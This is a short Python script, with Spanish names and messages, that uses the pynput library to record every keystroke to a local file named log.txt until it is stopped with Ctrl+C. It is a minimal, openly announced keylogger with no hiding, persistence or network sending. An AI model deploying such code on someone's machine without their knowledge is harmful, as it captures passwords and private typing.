from pynput.keyboard import Listener

def al_presionar(tecla):
    with open("log.txt", "a") as archivo:

        archivo.write(f"{tecla} ")

print("Grabando teclas... (Presiona Ctrl+C para salir)")

with Listener(on_press=al_presionar) as l:
    l.join()
